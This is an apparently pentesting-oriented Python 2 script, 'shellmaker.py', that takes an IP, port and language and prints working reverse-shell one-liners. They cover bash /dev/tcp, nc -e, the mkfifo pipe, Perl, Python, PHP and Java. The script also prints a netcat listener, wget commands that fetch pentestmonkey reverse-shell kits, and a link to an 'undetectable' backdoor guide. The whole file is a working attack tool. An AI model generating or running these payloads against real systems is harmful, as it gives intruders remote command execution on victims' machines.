#!/usr/bin/python

import sys
import os
from netifaces import interfaces, ifaddresses, AF_INET

if len(sys.argv) != 4:
    print "inspired by http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet \n"
    print "usage: shellmaker.py <ip> <port> <type>\n"

    for ifaceName in interfaces():
        addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP addr'}] )]
        print '%s: %s' % (ifaceName, ', '.join(addresses))
    sys.exit(0)

ip=sys.argv[1]
port=sys.argv[2]

print "your listener"
print "nc -nlvp %s \n" % (port)

if str(sys.argv[3]) == 'bash':
    print "bash -i >& /dev/tcp/%s/%s 0>&1" % (ip, port)
    print "nc -e /bin/sh %s %s" % (ip, port)
    print "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" % (ip, port)
    sys.exit(0)

if str(sys.argv[3]) == 'perl':
    print """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (ip, port)
    print "\n wget http://pentestmonkey.net/tools/perl-reverse-shell/perl-reverse-shell-1.0.tar.gz && tar xvzf perl-reverse-shell-1.0.tar.gz \n"
    print "remember to change the values in the script like so \n"
    print "my $ip = '%s';" % (ip)
    print "my $port = %s;" % (port)
    sys.exit(0)

if str(sys.argv[3]) == 'python':
    print """'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' """ % (ip, port)
    print "\n https://haiderm.com/simple-python-fully-undetectable-fud-reverse-shell-backdoor/"
    sys.exit(0)

if str(sys.argv[3]) == 'php':
    print """php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");' """ % (ip, port)
    print "\n wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz && tar xvzf php-reverse-shell-1.0.tar.gz \n"
    print "remember to change the values in the script like so \n"
    print "$ip = '%s';  // CHANGE THIS" % (ip)
    print "$port = %s;       // CHANGE THIS" % (port)
    sys.exit(0)

if str(sys.argv[3]) == 'ruby':
    print "http://pentestmonkey.net/tag/ruby"


if str(sys.argv[3]) == 'java':
    print "r = Runtime.getRuntime()"
    print """p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])""" % (ip, port)
    print """>&5; done"] as String[])"""
    print "p.waitFor()"
    sys.exit(0)

if str(sys.argv[3]) == 'xterm':
    print "xterm -display %s:%s" % (ip, port)
    sys.exit(0)
